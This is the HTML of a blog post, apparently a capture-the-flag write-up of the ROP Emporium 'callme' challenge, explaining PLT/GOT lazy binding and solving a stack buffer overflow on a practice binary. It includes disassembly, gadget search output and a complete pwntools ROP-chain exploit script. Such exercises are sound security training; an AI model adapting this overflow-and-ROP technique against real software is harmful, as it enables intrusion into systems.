@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP Emporium: callme">
+<meta property="og:url" content="https://rivers.sh/posts/ropemporium-callme/index.html">
+<meta property="og:site_name" content="River">
+<meta property="og:description" content="Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/callme/Pasted%20image%2020260129152951.png">
+<meta property="article:published_time" content="2026-01-28T05:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-27T05:30:32.742Z">
+<meta property="article:author" content="River">
+<meta property="article:tag" content="Binary Exploitation">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="x86-64">
+<meta property="article:tag" content="pwntools">
+<meta property="article:tag" content="PLT">
+<meta property="article:tag" content="GOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rivers.sh/images/callme/Pasted%20image%2020260129152951.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ROP Emporium: callme</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="River" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/htb-facts/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/ropemporium-split/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/ropemporium-callme/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/ropemporium-callme/&text=ROP Emporium: callme"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/ropemporium-callme/&is_video=false&description=ROP Emporium: callme"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP Emporium: callme&body=Check out this article: https://rivers.sh/posts/ropemporium-callme/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/ropemporium-callme/&name=ROP Emporium: callme&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/ropemporium-callme/&t=ROP Emporium: callme"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-info"><span class="toc-number">1.</span> <span class="toc-text">challenge info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLT-GOT-explanation"><span class="toc-number">2.</span> <span class="toc-text">PLT &amp; GOT explanation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example"><span class="toc-number">2.1.</span> <span class="toc-text">example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#methodology"><span class="toc-number">3.</span> <span class="toc-text">methodology</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnme-exploration"><span class="toc-number">3.1.</span> <span class="toc-text">pwnme exploration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploitation"><span class="toc-number">4.</span> <span class="toc-text">exploitation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ROP Emporium: callme
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">River</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T05:00:00.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/ROP-Emporium/">ROP Emporium</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="p-category" href="/tags/GOT/" rel="tag">GOT</a>, <a class="p-category" href="/tags/PLT/" rel="tag">PLT</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/pwntools/" rel="tag">pwntools</a>, <a class="p-category" href="/tags/x86-64/" rel="tag">x86-64</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="challenge-info"><a href="#challenge-info" class="headerlink" title="challenge info"></a>challenge info</h2><p>the challenge description already gives a ton of information by default;</p>
+<blockquote>
+<p>You must call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, each with the arguments <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> e.g. <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code> to print the flag. <strong>For the x86_64 binary</strong> double up those values, e.g. <code>callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code></p>
+</blockquote>
+<p>additionally, it urges to learn about the PLT (procedure linking table)</p>
+<p>i’m assuming the <code>callme</code> functions look something like:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">callme_one</span><span class="params">(<span class="type">long</span> arg1, <span class="type">long</span> arg2, <span class="type">long</span> arg3)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">callme_two</span><span class="params">(<span class="type">long</span> arg1, <span class="type">long</span> arg2, <span class="type">long</span> arg3)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">callme_three</span><span class="params">(<span class="type">long</span> arg1, <span class="type">long</span> arg2, <span class="type">long</span> arg3)</span>;</span><br></pre></td></tr></table></figure>
+<p>keep in mind the x64 calling convention:</p>
+<ol>
+<li><code>rdi</code></li>
+<li><code>rsi</code></li>
+<li><code>rdx</code></li>
+<li><code>rcx</code></li>
+<li><code>r8</code></li>
+<li><code>r9</code></li>
+<li>7th+ argument -&gt; stack</li>
+</ol>
+<h2 id="PLT-GOT-explanation"><a href="#PLT-GOT-explanation" class="headerlink" title="PLT &amp; GOT explanation"></a>PLT &amp; GOT explanation</h2><p>quick tldr:</p>
+<blockquote>
+<p>The <strong>Global Offset Table (GOT)</strong> and <strong>Procedure Linkage Table (PLT)</strong> are crucial mechanisms for dynamic linking in Linux binaries. They work together to enable efficient resolution of external function addresses at runtime.</p>
+</blockquote>
+<p>in practice, the PLT contains small stub functions for each external function, it’s basically like a ‘trampoline’ of sorts for each external function</p>
+<p>the GOT, however, contains the actual runtime addresses of external functions. it initially points back to the PLT for lazy binding, and gets updated with real addresses after the first call (lazy binding- think lazy loading!)</p>
+<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>first call to <code>callme_one()</code>:</p>
+<ol>
+<li>your code calls <code>callme_one@plt</code></li>
+<li>PLT jumps to address in <code>callme_one@got</code></li>
+<li>GOT initially points back to PLT resolver code</li>
+<li>resolver looks up real address &amp; updates GOT</li>
+<li>jumps to actual <code>callme_one()</code></li>
+</ol>
+<p>but, after this (subsequent calls):</p>
+<ol>
+<li>your code calls <code>callme_one@plt</code></li>
+<li>PLT jumps to address in <code>callme_one@got</code></li>
+<li>GOT now has real address, jumps directly there</li>
+</ol>
+<p>for this challenge, we need to call three functions (<code>callme_one</code>, <code>callme_two</code>, <code>callme_three</code>) with specific args, so the PLT entries are my buddies because:</p>
+<ul>
+<li>PLT addresses don’t change between runs (unlike the actual function addresses with ASLR)</li>
+<li>easy targets, since i can reliably jump to <code>callme_one@plt</code> in my ROP chain</li>
+<li>AND, i still get FULL FUNCTIONALITY! THAT’S RIGHT!!!! CALLING THE PLT ENTRY WORKS EXACTLY LIKE CALLING THE REAL FUNCTION!!!</li>
+</ul>
+<p><img src="/images/callme/Pasted%20image%2020260129152951.png" alt="PLT diagram"></p>
+<h2 id="methodology"><a href="#methodology" class="headerlink" title="methodology"></a>methodology</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file callme</span><br><span class="line">callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">File:     /home/river/Desktop/cyber/ropemporium/callme/callme</span><br><span class="line">Arch:     amd64</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">RUNPATH:    b<span class="string">&#x27;.&#x27;</span></span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>the challenge description recommended we use rabin2, so i’ll use that for once lol:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ rabin2 -i callme</span><br><span class="line">nth vaddr      <span class="built_in">bind</span>   <span class="built_in">type</span>   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x004006d0 GLOBAL FUNC       puts</span><br><span class="line">2   0x004006e0 GLOBAL FUNC       <span class="built_in">printf</span></span><br><span class="line">3   0x004006f0 GLOBAL FUNC       callme_three</span><br><span class="line">4   0x00400700 GLOBAL FUNC       memset</span><br><span class="line">5   0x00400710 GLOBAL FUNC       <span class="built_in">read</span></span><br><span class="line">6   ---------- GLOBAL FUNC       __libc_start_main</span><br><span class="line">7   0x00400720 GLOBAL FUNC       callme_one</span><br><span class="line">8   ---------- WEAK   NOTYPE     __gmon_start__</span><br><span class="line">9   0x00400730 GLOBAL FUNC       setvbuf</span><br><span class="line">10  0x00400740 GLOBAL FUNC       callme_two</span><br><span class="line">11  0x00400750 GLOBAL FUNC       <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pwnme-exploration"><a href="#pwnme-exploration" class="headerlink" title="pwnme exploration"></a>pwnme exploration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass pwnme</span><br><span class="line">Dump of assembler code for function pwnme:</span><br><span class="line">   0x0000000000400898 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000400899 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x000000000040089c &lt;+4&gt;:	sub    rsp,0x20</span><br><span class="line">   0x00000000004008a0 &lt;+8&gt;:	lea    rax,[rbp-0x20]</span><br><span class="line">   0x00000000004008a4 &lt;+12&gt;:	mov    edx,0x20</span><br><span class="line">   0x00000000004008a9 &lt;+17&gt;:	mov    esi,0x0</span><br><span class="line">   0x00000000004008ae &lt;+22&gt;:	mov    rdi,rax</span><br><span class="line">   0x00000000004008b1 &lt;+25&gt;:	call   0x400700 &lt;memset@plt&gt;</span><br><span class="line">   0x00000000004008b6 &lt;+30&gt;:	mov    edi,0x4009f0</span><br><span class="line">   0x00000000004008bb &lt;+35&gt;:	call   0x4006d0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004008c0 &lt;+40&gt;:	mov    edi,0x400a13</span><br><span class="line">   0x00000000004008c5 &lt;+45&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004008ca &lt;+50&gt;:	call   0x4006e0 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004008cf &lt;+55&gt;:	lea    rax,[rbp-0x20]</span><br><span class="line">   0x00000000004008d3 &lt;+59&gt;:	mov    edx,0x200</span><br><span class="line">   0x00000000004008d8 &lt;+64&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004008db &lt;+67&gt;:	mov    edi,0x0</span><br><span class="line">   0x00000000004008e0 &lt;+72&gt;:	call   0x400710 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004008e5 &lt;+77&gt;:	mov    edi,0x400a16</span><br><span class="line">   0x00000000004008ea &lt;+82&gt;:	call   0x4006d0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004008ef &lt;+87&gt;:	nop</span><br><span class="line">   0x00000000004008f0 &lt;+88&gt;:	leave</span><br><span class="line">   0x00000000004008f1 &lt;+89&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>vulnerable to bof:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004008cf &lt;+55&gt;:	lea    rax,[rbp-0x20]</span><br><span class="line">0x00000000004008d3 &lt;+59&gt;:	mov    edx,0x200</span><br></pre></td></tr></table></figure>
+<p>looks like it’s setting up for a function call, maybe <code>read()</code> or <code>fgets()</code></p>
+<h2 id="exploitation"><a href="#exploitation" class="headerlink" title="exploitation"></a>exploitation</h2><p>alright so whenever i write my payloads i like to really modularize everything, i like having a section for relevant addresses, which i’ll assign to variables, and i just overall prefer the neatness &amp; compartmentalization of pwn exploits like this</p>
+<p>tldr though, i ended up:</p>
+<ol>
+<li>noting the addresses of <code>callme_one</code>, <code>callme_two</code>, and <code>callme_three</code>, which i did via rabin2 (as noted above)</li>
+<li>noting the values we’ll have to change: <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code>, etc.</li>
+<li>writing the initial payload to overflow the vulnerable buffer which i found via the <code>lea</code> &amp; <code>mov</code> pattern, which was 40 bytes (32 byte buffer + 8 bytes for saved rbp &#x3D; 40 bytes to reach RIP (return address))</li>
+<li>“new” part: using ropper to find the gadgets<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ropper --file callme --search <span class="string">&quot;pop rdi; pop rsi; pop rdx&quot;</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi; pop rsi; pop rdx</span><br><span class="line"></span><br><span class="line">[INFO] File: callme</span><br><span class="line">0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>noted this address, and my payload ended up looking like:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./callme&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = p64(0x40093c)</span><br><span class="line"></span><br><span class="line"># addresses</span><br><span class="line">callme_one = p64(0x00400720)</span><br><span class="line">callme_two = p64(0x00400740)</span><br><span class="line">callme_three = p64(0x004006f0)</span><br><span class="line"></span><br><span class="line"># args</span><br><span class="line">arg1 = p64(0xdeadbeefdeadbeef)</span><br><span class="line">arg2 = p64(0xcafebabecafebabe)</span><br><span class="line">arg3 = p64(0xd00df00dd00df00d)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*40</span><br><span class="line"></span><br><span class="line">payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_one</span><br><span class="line">payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_two</span><br><span class="line">payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_three</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>why this works:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The gadget executes:</span></span><br><span class="line"><span class="comment"># pop rdi    &lt;- pops arg1 from stack into rdi</span></span><br><span class="line"><span class="comment"># pop rsi    &lt;- pops arg2 from stack into rsi</span></span><br><span class="line"><span class="comment"># pop rdx    &lt;- pops arg3 from stack into rdx</span></span><br><span class="line"><span class="comment"># ret        &lt;- jumps to callme_one (next value on stack)</span></span><br></pre></td></tr></table></figure>
+<p>and all done!</p>
+<p>note: if that exact gadget had NOT existed, i would have had to find individual <code>pop</code> calls:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi   <span class="comment"># 0x??????: pop rdi; ret</span></span><br><span class="line">pop_rsi   <span class="comment"># 0x??????: pop rsi; ret</span></span><br><span class="line">pop_rdx   <span class="comment"># 0x??????: pop rdx; ret</span></span><br></pre></td></tr></table></figure>
+
+<p>and exploitation would have been more like:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload += pop_rdi_gadget</span><br><span class="line">payload += arg1</span><br><span class="line">payload += pop_rsi_gadget</span><br><span class="line">payload += arg2</span><br><span class="line">payload += pop_rdx_gadget</span><br><span class="line">payload += arg3</span><br><span class="line">payload += callme_one</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-info"><span class="toc-number">1.</span> <span class="toc-text">challenge info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLT-GOT-explanation"><span class="toc-number">2.</span> <span class="toc-text">PLT &amp; GOT explanation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example"><span class="toc-number">2.1.</span> <span class="toc-text">example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#methodology"><span class="toc-number">3.</span> <span class="toc-text">methodology</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnme-exploration"><span class="toc-number">3.1.</span> <span class="toc-text">pwnme exploration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploitation"><span class="toc-number">4.</span> <span class="toc-text">exploitation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/ropemporium-callme/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/ropemporium-callme/&text=ROP Emporium: callme"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/ropemporium-callme/&is_video=false&description=ROP Emporium: callme"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP Emporium: callme&body=Check out this article: https://rivers.sh/posts/ropemporium-callme/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/ropemporium-callme/&title=ROP Emporium: callme"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/ropemporium-callme/&name=ROP Emporium: callme&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/ropemporium-callme/&t=ROP Emporium: callme"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    River
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
